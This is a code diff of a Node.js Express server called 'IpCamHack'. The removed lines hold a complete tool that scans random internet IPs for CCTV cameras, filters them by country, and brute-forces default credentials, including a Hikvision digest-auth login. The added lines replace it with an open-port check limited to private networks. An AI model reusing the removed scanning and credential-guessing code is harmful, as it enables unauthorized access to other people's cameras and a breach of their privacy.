@@ -1,333 +1,157 @@
 const express = require('express');
 const cors = require('cors');
 const net = require('net');
-const http = require('http');
-const crypto = require('crypto');
+const path = require('path');
 
 const app = express();
-app.use(cors());
-app.use(express.json());
+app.disable('x-powered-by');
+app.use(cors({ origin: process.env.CORS_ORIGIN || false }));
+app.use(express.json({ limit: '16kb' }));
+app.use(express.static(path.join(__dirname, '..', 'public'), { index: 'index.html' }));
 
-// ========== কনফিগারেশন ==========
-const PORTS = [80, 8080, 443, 554, 37777, 8000];
-const TIMEOUT = 1500;
-const MAX_CONCURRENT = 20;
-
-const DEFAULT_CREDS = [
-  { user: 'admin', pass: 'admin123' },
-  { user: 'admin', pass: 'admin1234' },
-  { user: 'admin', pass: '12345' },
-  { user: 'admin', pass: 'password' },
-  { user: 'admin', pass: '123456' },
-  { user: 'root', pass: '12345' },
-  { user: 'user', pass: 'user' },
-  { user: 'admin', pass: 'Admin123' },
-  { user: 'admin', pass: '12345678' },
-  { user: 'admin', pass: '888888' },
-  { user: 'admin', pass: '666666' },
-];
-
-const BRAND_SIGNATURES = [
-  { pattern: /Hikvision/i, brand: 'Hikvision' },
-  { pattern: /Dahua/i, brand: 'Dahua' },
-  { pattern: /TP-Link/i, brand: 'TP-Link' },
-  { pattern: /Xiaomi/i, brand: 'Xiaomi' },
-  { pattern: /Axis/i, brand: 'Axis' },
-  { pattern: /Sony/i, brand: 'Sony' },
-  { pattern: /Panasonic/i, brand: 'Panasonic' },
-  { pattern: /Bosch/i, brand: 'Bosch' },
-  { pattern: /Samsung/i, brand: 'Samsung' },
-  { pattern: /Vivotek/i, brand: 'Vivotek' },
-];
-
-// APNIC 44 দেশসমূহ
-const ALL_COUNTRIES = [
-  'BD','IN','CN','JP','SG','PK','AU','NZ','VN','TH','KR','MY','PH','ID',
-  'LK','NP','KH','LA','MM','BN','PG','FJ','SB','VU','WS','TO','KI','TV',
-  'MH','FM','PW','NR','CK','NU','TK','WF','AS','GU','MP','VI','PR','UM',
-  'HK','MO','TW'
-];
-
+const PORTS = [80, 443, 554, 8000, 8080, 8554, 37777];
+const TIMEOUT_MS = 900;
+const MAX_HOSTS = 256;
+const MAX_CONCURRENT = 24;
+let stats = { scanned: 0, found: 0, lastScanAt: null };
 let foundCameras = [];
-let validCameras = [];
-let stats = { scanned: 0, found: 0 };
+let scanInProgress = false;
 
-// ========== হেল্পার ==========
-function randomIP() {
-  return `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
+function isPrivateIPv4(ip) {
+  if (net.isIP(ip) !== 4) return false;
+  const p = ip.split('.').map(Number);
+  return p[0] === 10 ||
+    (p[0] === 172 && p[1] >= 16 && p[1] <= 31) ||
+    (p[0] === 192 && p[1] === 168) ||
+    (p[0] === 127);
 }
-
-async function getGeo(ip) {
-  try {
-    const url = `http://ip-api.com/json/${ip}?fields=countryCode,city`;
-    const data = await new Promise((resolve, reject) => {
-      http.get(url, (res) => {
-        let body = '';
-        res.on('data', chunk => body += chunk);
-        res.on('end', () => {
-          try { resolve(JSON.parse(body)); } catch(e) { reject(e); }
-        });
-      }).on('error', reject);
-    });
-    if (data && data.countryCode) {
-      return { country: data.countryCode, city: data.city || 'Unknown' };
+function ipToInt(ip) {
+  return ip.split('.').reduce((n, octet) => ((n << 8) | Number(octet)) >>> 0, 0);
+}
+function intToIp(n) {
+  return [n >>> 24, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
+}
+function expandRange(input) {
+  const range = String(input || '').trim();
+  if (range.includes('/')) {
+    const [base, maskText, ...extra] = range.split('/');
+    if (extra.length || net.isIP(base) !== 4 || !/^\d{1,2}$/.test(maskText)) {
+      throw new Error('Enter a valid IPv4 CIDR, such as 192.168.1.0/24.');
     }
-    return { country: 'XX', city: 'Unknown' };
-  } catch {
-    return { country: 'XX', city: 'Unknown' };
+    const mask = Number(maskText);
+    if (mask < 24 || mask > 32) throw new Error('CIDR must be /24 to /32; larger ranges exceed the 256-address scan limit.');
+    const count = 2 ** (32 - mask);
+    const start = ipToInt(base);
+    const network = (start & ((0xffffffff << (32 - mask)) >>> 0)) >>> 0;
+    const hosts = Array.from({ length: count }, (_, i) => intToIp((network + i) >>> 0));
+    if (!hosts.every(isPrivateIPv4)) throw new Error('Only private or loopback IPv4 addresses are allowed.');
+    return hosts;
   }
+  if (range.includes('-')) {
+    const parts = range.split('-').map(s => s.trim());
+    if (parts.length !== 2 || parts.some(ip => net.isIP(ip) !== 4)) {
+      throw new Error('Enter a valid range, such as 192.168.1.10-192.168.1.30.');
+    }
+    const start = ipToInt(parts[0]), end = ipToInt(parts[1]);
+    if (end < start || end - start + 1 > MAX_HOSTS) throw new Error('Range must be ascending and contain at most 256 addresses.');
+    const hosts = Array.from({ length: end - start + 1 }, (_, i) => intToIp((start + i) >>> 0));
+    if (!hosts.every(isPrivateIPv4)) throw new Error('Only private or loopback IPv4 addresses are allowed.');
+    return hosts;
+  }
+  if (net.isIP(range) !== 4 || !isPrivateIPv4(range)) {
+    throw new Error('Enter a private IPv4 address (10/8, 172.16/12, 192.168/16) or loopback address.');
+  }
+  return [range];
 }
-
-function isPortOpen(ip, port) {
-  return new Promise((resolve) => {
+function checkPort(ip, port) {
+  return new Promise(resolve => {
     const socket = new net.Socket();
-    const timer = setTimeout(() => {
-      socket.destroy();
-      resolve(false);
-    }, TIMEOUT);
-    socket.on('connect', () => {
+    let settled = false;
+    const finish = open => {
+      if (settled) return;
+      settled = true;
       clearTimeout(timer);
       socket.destroy();
-      resolve(true);
-    });
-    socket.on('error', () => {
-      clearTimeout(timer);
-      resolve(false);
-    });
+      resolve(open);
+    };
+    const timer = setTimeout(() => finish(false), TIMEOUT_MS);
+    socket.setTimeout(TIMEOUT_MS, () => finish(false));
+    socket.once('connect', () => finish(true));
+    socket.once('error', () => finish(false));
     socket.connect(port, ip);
   });
 }
-
-function httpRequest(ip, port, path = '/', auth = null, method = 'GET') {
-  return new Promise((resolve) => {
-    const options = {
-      hostname: ip,
-      port: port,
-      path: path,
-      method: method,
-      timeout: TIMEOUT,
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    };
-    if (auth) {
-      options.headers['Authorization'] = 'Basic ' + Buffer.from(`${auth.user}:${auth.pass}`).toString('base64');
+async function mapLimit(items, limit, fn) {
+  const out = [];
+  let next = 0;
+  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
+    while (next < items.length) {
+      const i = next++;
+      out[i] = await fn(items[i]);
     }
-    const req = http.request(options, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => {
-        resolve({ statusCode: res.statusCode, headers: res.headers, body: data });
-      });
-    });
-    req.on('error', () => resolve(null));
-    req.on('timeout', () => { req.destroy(); resolve(null); });
-    req.end();
   });
+  await Promise.all(workers);
+  return out;
 }
-
-async function tryHikvisionDigest(ip, port, cred) {
-  try {
-    const options = {
-      hostname: ip,
-      port: port,
-      path: '/ISAPI/Security/userCheck',
-      method: 'GET',
-      timeout: TIMEOUT,
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    };
-    const challenge = await new Promise((resolve) => {
-      const req = http.request(options, (res) => {
-        const authHeader = res.headers['www-authenticate'];
-        resolve(authHeader || null);
-      });
-      req.on('error', () => resolve(null));
-      req.on('timeout', () => { req.destroy(); resolve(null); });
-      req.end();
-    });
-    if (!challenge) return false;
-    const realm = challenge.match(/realm="([^"]+)"/)?.[1] || '';
-    const nonce = challenge.match(/nonce="([^"]+)"/)?.[1] || '';
-    if (!realm || !nonce) return false;
-    const uri = '/ISAPI/Security/userCheck';
-    const nc = '00000001';
-    const cnonce = 'abc123';
-    const qop = 'auth';
-    const ha1 = crypto.createHash('md5').update(`${cred.user}:${realm}:${cred.pass}`).digest('hex');
-    const ha2 = crypto.createHash('md5').update(`GET:${uri}`).digest('hex');
-    const response = crypto.createHash('md5').update(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`).digest('hex');
-    const authHeader = `Digest username="${cred.user}", realm="${realm}", nonce="${nonce}", uri="${uri}", response="${response}", qop=${qop}, nc=${nc}, cnonce="${cnonce}"`;
-    const authOptions = {
-      hostname: ip,
-      port: port,
-      path: uri,
-      method: 'GET',
-      timeout: TIMEOUT,
-      headers: {
-        'Authorization': authHeader,
-        'User-Agent': 'Mozilla/5.0'
-      }
-    };
-    const result = await new Promise((resolve) => {
-      const req = http.request(authOptions, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-          resolve({ statusCode: res.statusCode, body: data });
-        });
-      });
-      req.on('error', () => resolve(null));
-      req.on('timeout', () => { req.destroy(); resolve(null); });
-      req.end();
-    });
-    return result && result.statusCode === 200;
-  } catch {
-    return false;
-  }
-}
-
-async function scanIP(ip, port, selectedCountries) {
-  const open = await isPortOpen(ip, port);
-  if (!open) return null;
-
-  const response = await httpRequest(ip, port, '/');
-  if (!response) return null;
-
-  let brand = 'Unknown';
-  const body = response.body || '';
-  const serverHeader = response.headers?.server || '';
-  const fullText = body + ' ' + serverHeader;
-  for (const sig of BRAND_SIGNATURES) {
-    if (sig.pattern.test(fullText)) {
-      brand = sig.brand;
-      break;
-    }
-  }
-
-  const geo = await getGeo(ip);
-  // কান্ট্রি ফিল্টার
-  if (selectedCountries && selectedCountries.length > 0 && !selectedCountries.includes(geo.country)) {
-    return null; // এই দেশ বাদ
-  }
-
-  let validCred = null;
-  for (const cred of DEFAULT_CREDS) {
-    let success = false;
-    if (brand === 'Hikvision') {
-      success = await tryHikvisionDigest(ip, port, cred);
-    } else {
-      const authRes = await httpRequest(ip, port, '/', cred);
-      if (authRes && authRes.statusCode === 200) success = true;
-    }
-    if (success) {
-      validCred = cred;
-      break;
-    }
-  }
-
+async function inspectHost(ip) {
+  const checks = await Promise.all(PORTS.map(async port => (await checkPort(ip, port)) ? port : null));
+  const openPorts = checks.filter(Boolean);
+  if (!openPorts.length) return null;
   return {
-    ip,
-    port,
-    brand,
-    geo: `${geo.country} (${geo.city})`,
-    username: validCred ? validCred.user : null,
-    password: validCred ? validCred.pass : null,
+    ip, openPorts,
+    possibleCamera: openPorts.some(p => [554, 8554, 37777].includes(p)),
+    checkedAt: new Date().toISOString()
   };
 }
 
-async function scanIPs(ipList, selectedCountries = []) {
-  const results = [];
-  const chunks = [];
-  for (let i = 0; i < ipList.length; i += MAX_CONCURRENT) {
-    chunks.push(ipList.slice(i, i + MAX_CONCURRENT));
-  }
-  for (const chunk of chunks) {
-    const promises = chunk.map(async (ip) => {
-      for (const port of PORTS) {
-        const cam = await scanIP(ip, port, selectedCountries);
-        if (cam) {
-          results.push(cam);
-          foundCameras.push(cam);
-          if (cam.username && cam.password) validCameras.push(cam);
-          break;
-        }
-      }
-      stats.scanned++;
-    });
-    await Promise.all(promises);
-  }
-  stats.found += results.length;
-  return results;
-}
-
-// ========== API ==========
-app.post('/api/scan/random', async (req, res) => {
-  const { countries = [] } = req.body;
-  const count = 15;
-  const ips = Array.from({ length: count }, () => randomIP());
-  const found = await scanIPs(ips, countries);
-  res.json({ summary: `Scanned ${ips.length} IPs, found ${found.length} cameras.`, found, valid: validCameras, stats });
-});
-
+app.get('/api/health', (_req, res) => res.json({
+  ok: true,
+  service: 'IpCamHack private-network camera inventory',
+  version: '4.0.0',
+  environment: process.env.VERCEL ? 'serverless' : 'local'
+}));
+app.get('/api/status', (_req, res) => res.json({ stats, results: foundCameras, scanInProgress }));
 app.post('/api/scan/range', async (req, res) => {
-  const { range, countries = [] } = req.body;
-  if (!range) return res.status(400).json({ error: 'Range required' });
-  let ips = [];
+  // A cloud function cannot reach the user's LAN; do not turn this endpoint into a private-network probe.
+  if (process.env.VERCEL) {
+    return res.status(501).json({
+      error: 'Private-network scanning is available when running IpCamHack locally on the network you own. A hosted server cannot scan your local LAN.'
+    });
+  }
+  if (scanInProgress) return res.status(409).json({ error: 'A scan is already in progress. Please wait for it to finish.' });
+  let hosts;
   try {
-    if (range.includes('/')) {
-      const base = range.split('/')[0];
-      const parts = base.split('.');
-      for (let i = 1; i <= 10; i++) ips.push(`${parts[0]}.${parts[1]}.${parts[2]}.${i}`);
-    } else if (range.includes('-')) {
-      const [start, end] = range.split('-');
-      const startParts = start.split('.');
-      const endParts = end.split('.');
-      const sLast = parseInt(startParts[3]);
-      const eLast = parseInt(endParts[3]);
-      for (let i = sLast; i <= Math.min(eLast, sLast + 10); i++) {
-        ips.push(`${startParts[0]}.${startParts[1]}.${startParts[2]}.${i}`);
-      }
-    } else {
-      ips = [range];
-    }
-  } catch (e) {
-    return res.status(400).json({ error: 'Invalid range format' });
+    hosts = expandRange(req.body && req.body.range);
+    if (!hosts.length) return res.status(400).json({ error: 'No private addresses were found in that range.' });
+  } catch (error) {
+    return res.status(400).json({ error: error.message || 'Invalid range.' });
   }
-  const found = await scanIPs(ips, countries);
-  res.json({ summary: `Scanned ${ips.length} IPs, found ${found.length}.`, found, valid: validCameras, stats });
-});
-
-app.post('/api/validate', async (req, res) => {
-  const toValidate = foundCameras.filter(c => !c.username);
-  const newlyValid = [];
-  for (const cam of toValidate) {
-    for (const cred of DEFAULT_CREDS) {
-      let success = false;
-      if (cam.brand === 'Hikvision') {
-        success = await tryHikvisionDigest(cam.ip, cam.port, cred);
-      } else {
-        const authRes = await httpRequest(cam.ip, cam.port, '/', cred);
-        if (authRes && authRes.statusCode === 200) success = true;
-      }
-      if (success) {
-        cam.username = cred.user;
-        cam.password = cred.pass;
-        validCameras.push(cam);
-        newlyValid.push(cam);
-        break;
-      }
-    }
+  scanInProgress = true;
+  try {
+    const results = (await mapLimit(hosts, MAX_CONCURRENT, inspectHost)).filter(Boolean);
+    foundCameras = results;
+    stats = { scanned: hosts.length, found: results.length, lastScanAt: new Date().toISOString() };
+    return res.json({
+      summary: 'Checked ' + hosts.length + ' authorized private-network address(es); ' + results.length + ' host(s) have camera-related ports open.',
+      found: results, stats
+    });
+  } catch (_error) {
+    return res.status(500).json({ error: 'The scan failed unexpectedly. Check the local runtime and try again.' });
+  } finally {
+    scanInProgress = false;
   }
-  res.json({ valid: newlyValid, stats });
 });
-
-app.get('/api/valid/list', (req, res) => {
-  res.json({ valid: validCameras, stats });
-});
-
-app.post('/api/clear', (req, res) => {
+app.post('/api/clear', (_req, res) => {
   foundCameras = [];
-  validCameras = [];
-  stats = { scanned: 0, found: 0 };
-  res.json({ success: true });
+  stats = { scanned: 0, found: 0, lastScanAt: null };
+  res.json({ success: true, stats });
 });
 
+if (require.main === module) {
+  const port = Number(process.env.PORT) || 3000;
+  app.listen(port, '0.0.0.0', () => {
+    console.log('IpCamHack running at http://localhost:' + port);
+    if (process.env.VERCEL) console.log('Hosted mode: private LAN scanning is disabled.');
+  });
+}
 module.exports = app;
